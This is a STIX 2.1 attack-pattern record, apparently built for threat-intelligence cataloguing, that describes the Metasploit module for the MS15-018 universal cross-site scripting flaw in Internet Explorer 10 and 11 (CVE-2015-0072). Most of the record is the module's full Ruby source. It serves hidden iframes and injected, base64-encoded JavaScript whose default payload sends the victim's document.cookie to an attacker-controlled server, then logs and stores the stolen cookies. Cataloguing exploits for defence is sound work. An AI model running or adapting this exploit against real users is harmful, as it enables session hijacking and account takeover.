{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c3b0a7e5-2300-4077-abd3-afd8a73ff961",
    "created": "2024-08-14T16:32:31.745355Z",
    "modified": "2024-08-14T16:32:31.745359Z",
    "name": "\"MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection\"",
    "description": " This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet Explorer 10 and 11. By default, you will steal the cookie from TARGET_URI (which cannot have X-Frame-Options or it will fail). You can also have your own custom JavaScript by setting the CUSTOMJS option. Lastly, you might need to configure the URIHOST option if you are behind NAT.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ie_uxss_injection.rb",
            "external_id": "ie_uxss_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0072"
        },
        {
            "source_name": "reference",
            "url": "http://innerht.ml/blog/ie-uxss.html"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Feb/10"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS15-018 Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection\",\n      'Description'    => %q{\n          This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet\n          Explorer 10 and 11. By default, you will steal the cookie from TARGET_URI (which cannot\n          have X-Frame-Options or it will fail). You can also have your own custom JavaScript\n          by setting the CUSTOMJS option. Lastly, you might need to configure the URIHOST option if\n          you are behind NAT.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'David Leo',      # Original discovery\n          'filedescriptor', # PoC\n          'joev',           # He figured it out really\n          'sinn3r'          # MSF\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2015-0072' ],\n          [ 'OSVDB', '117876' ],\n          [ 'MSB', 'MS15-018' ],\n          [ 'URL', 'http://innerht.ml/blog/ie-uxss.html' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Feb/10' ]\n        ],\n      'Platform'       => 'win',\n      'DisclosureDate' => '2015-02-01'\n    ))\n\n    register_options(\n    [\n      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),\n      OptString.new('CUSTOMJS', [ false, 'Custom JavaScript' ])\n    ])\n  end\n\n  def setup\n    if target_uri !~ /^http/i\n      raise Msf::OptionValidateError.new(['TARGET_URI'])\n    end\n\n    super\n  end\n\n  def target_uri\n    datastore['TARGET_URI']\n  end\n\n  def get_html\n    @html ||= html\n  end\n\n  def ninja_cookie_stealer_name\n    @ninja ||= \"#{Rex::Text.rand_text_alpha(5)}.php\"\n  end\n\n  def get_uri(cli=self.cli)\n    ssl = datastore[\"SSL\"]\n    proto = (ssl ? \"https://\" : \"http://\")\n    if datastore['URIHOST']\n      host = datastore['URIHOST']\n    elsif (cli and cli.peerhost)\n      host = Rex::Socket.source_address(cli.peerhost)\n    else\n      host = srvhost_addr\n    end\n\n    if Rex::Socket.is_ipv6?(host)\n      host = \"[#{host}]\"\n    end\n\n    if datastore['URIPORT']\n      port = ':' + datastore['URIPORT'].to_s\n    elsif (ssl and datastore[\"SRVPORT\"] == 443)\n      port = ''\n    elsif (!ssl and datastore[\"SRVPORT\"] == 80)\n      port = ''\n    else\n      port = \":\" + datastore[\"SRVPORT\"].to_s\n    end\n\n    uri = proto + host + port + get_resource\n\n    uri\n  end\n\n  def server_uri\n    @server_uri ||= get_uri\n  end\n\n  def js\n    datastore['CUSTOMJS'] || %Q|var e = document.createElement('img'); e.src='#{server_uri}/#{ninja_cookie_stealer_name}?data=' + encodeURIComponent(document.cookie);|\n  end\n\n  def html\n    %Q|\n<iframe style=\"display:none\" src=\"#{get_resource}/redirect.php\"></iframe>\n<iframe style=\"display:none\" src=\"#{datastore['TARGET_URI']}\"></iframe>\n<script>\n    window.onmessage = function(e){ top[1].postMessage(atob(\"#{Rex::Text.encode_base64(js)}\"),\"*\"); };\n    var payload = 'window.onmessage=function(e){ setTimeout(e.data); }; top.postMessage(\\\\\\\\\"\\\\\\\\\",\\\\\\\\\"*\\\\\\\\\")';\n    top[0].eval('_=top[1];with(new XMLHttpRequest)open(\"get\",\"#{get_resource}/sleep.php\",false),send();_.location=\"javascript:%22%3Cscript%3E'+ encodeURIComponent(payload) +'%3C%2Fscript%3E%22\"');\n</script>\n    |\n  end\n\n  def run\n    exploit\n  end\n\n  def extract_cookie(uri)\n    Rex::Text.uri_decode(uri.to_s.scan(/#{ninja_cookie_stealer_name}\\?data=(.+)/).flatten[0].to_s)\n  end\n\n  def on_request_uri(cli, request)\n    case request.uri\n    when /redirect\\.php/\n      print_status(\"Sending redirect\")\n      send_redirect(cli, \"#{datastore['TARGET_URI']}\")\n    when /sleep\\.php/\n      sleep(3)\n      send_response(cli, '')\n    when /#{ninja_cookie_stealer_name}/\n      data = extract_cookie(request.uri)\n      if data.blank?\n        print_status(\"The XSS worked, but no cookie\")\n      else\n        print_status(\"Got cookie\")\n        print_line(data)\n        report_note(\n          :host => cli.peerhost,\n          :type => 'ie.cookie',\n          :data => data\n        )\n        path = store_loot('ie_uxss_cookie', \"text/plain\", cli.peerhost, data, \"#{cli.peerhost}_ie_cookie.txt\", \"IE Cookie\")\n        vprint_good(\"Cookie stored as: #{path}\")\n      end\n    else\n      print_status(\"Sending HTML\")\n      send_response(cli, get_html)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-01",
    "x_mitre_platforms": [
        "win'"
    ]
}